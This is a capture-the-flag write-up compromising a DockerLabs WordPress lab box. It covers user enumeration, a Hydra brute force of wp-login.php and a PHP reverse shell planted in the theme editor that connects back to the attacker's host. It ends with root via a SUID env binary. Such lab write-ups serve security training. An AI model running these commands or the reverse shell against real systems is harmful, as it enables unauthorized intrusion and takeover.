# WalkingCMS - Writeup

## 📋 General Information

- **Platform**: DockerLabs
- **Difficulty**: Easy
- **Categories**: WordPress | Web Exploitation | Privilege Escalation
- **Date**: 02/25/2026
- **Time spent**: ~40 minutes
- **Author**: Samuel Rodríguez aka Testarious

## 🔍 Reconnaissance and Enumeration

### Port Scanning

We start by performing a port scan to identify available services:

```bash
# Full port scan
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

# Detailed scan of open ports
nmap -sCV -p80 172.17.0.2
```

**Results:**
![Nmap](./content/screenshots/WalkingCMS/nmap.png)

As we can see, only port 80 is exposed. When accessing through the browser, we observe the default Apache2 Debian page.

![Apache](./content/screenshots/WalkingCMS/apache.png)

### Directory and File Enumeration

So we perform a directory scan with `gobuster` and find `/wordpress`:

```bash
# Gobuster directory enumeration
gobuster dir -u 172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster](./content/screenshots/WalkingCMS/gobuster.png)

When accessing `/wordpress`, we see a WordPress website. And browsing through the different pages, we see a post and notice the author's name (possible user):

![Wordpress](./content/screenshots/WalkingCMS/post-wp.png)

We also observe the technologies used on the page along with their versions using the `Wappalyzer` extension:

![Wappalyzer](./content/screenshots/WalkingCMS/wappalyzer.png)

And here we notice the WordPress version (6.4.3). So we do a Google search to see if we find any known vulnerabilities. And indeed, we find a vulnerability in WordPress version 6.4.3 where we can see registered users.

➡️ [Exploit to view users](https://sploitus.com/exploit?id=1337DAY-ID-39351)

![Vulnerability](./content/screenshots/WalkingCMS/exploit_users.png)

We can also reach the same result using the `wpscan` tool:

```bash
wpscan --url http://172.17.0.2/wordpress --enumerate
```

![Wpscan](./content/screenshots/WalkingCMS/wpscan.png)

We confirm that the user `mario` that we saw earlier in a web post exists.

## 💻 Exploitation

### Attack Vector 1: Brute Force

Since we already have the user `mario`, we can try brute force to obtain the password for the WordPress login web page (http://172.17.0.2/wordpress/wp-login.php).

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:S=Location" -t 50   
```

![Hydra](./content/screenshots/WalkingCMS/password.png)

This attack returns the password for user `mario`: `love`. We log into the WordPress website with the obtained credentials successfully.

![Login](./content/screenshots/WalkingCMS/wordpress.png)

### Attack Vector 2: Reverse Shell Establishment

Now from the WordPress admin panel, we can edit the active theme to establish a reverse shell connection, listening from our machine and putting the following PHP code (obtained from revshells.com with some modifications to work correctly):

```bash
nc -nlvp 9999

$s=fsockopen("172.17.0.1",9999);$proc=proc_open("/bin/bash -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);
```

![Edit Theme](./content/screenshots/WalkingCMS/editphp.png)

![Reverse Shell](./content/screenshots/WalkingCMS/reverse_shell.png)

And thus we gain access to the machine as user `www-data`.

## 🔐 Privilege Escalation

### Local Enumeration

We use the `find` command to search for binaries with SUID permissions:

```bash
find / -perm -4000 2>/dev/null
```

We observe that the `env` binary has SUID permissions. So we can execute the following command to gain root access. This command and others for privilege escalation can be found in [GTFOBins](https://gtfobins.github.io/).

```bash
env /bin/sh -p
```

![Find](./content/screenshots/WalkingCMS/root.png)

Finally, we obtain access to the machine as root user 🎉​


## 🛠️ Tools Used

| Tool | Version | Specific Use |
|-------------|---------|----------------|
| nmap | 7.98 | Port and service scanning |
| wappalyzer | 6.10 | Web technology identification |
| gobuster | 3.8.2 | Web directory enumeration |
| hydra | 9.6 | Brute force on WordPress login |
| wpscan | 3.8.28 | WordPress vulnerability scanning |

## 🔗 Additional Resources

- [DockerLabs WhereIsMyWebShell](https://dockerlabs.es/)
- [Exploit to view users](https://sploitus.com/exploit?id=1337DAY-ID-39351)
- [Reverse Shell Generator](https://www.revshells.com/)
- [GTFOBins](https://gtfobins.github.io/)

## 🏆 Conclusion

This CTF represents an excellent practical example of pentesting in WordPress-based web environments. Throughout this exercise, we have demonstrated the importance of a methodological approach that combines:

- **Thorough reconnaissance**: Identifying specific technologies and versions (WordPress 6.4.3) was crucial for discovering known vulnerabilities.
- **Systematic enumeration**: The combined use of tools like gobuster and wpscan allowed us to discover valid users and attack surfaces.
- **Controlled exploitation**: Brute force on weak credentials (`mario:love`) demonstrated how insecure configurations can compromise entire systems.
- **Persistence and escalation**: Modifying themes to establish reverse shells and exploiting SUID permissions in binaries like `env` illustrate common privilege escalation vectors.

This lab reinforces fundamental web security concepts: the importance of keeping CMS updated, implementing robust password policies, and restricting unnecessary permissions at the system level.

Let's continue! 🚀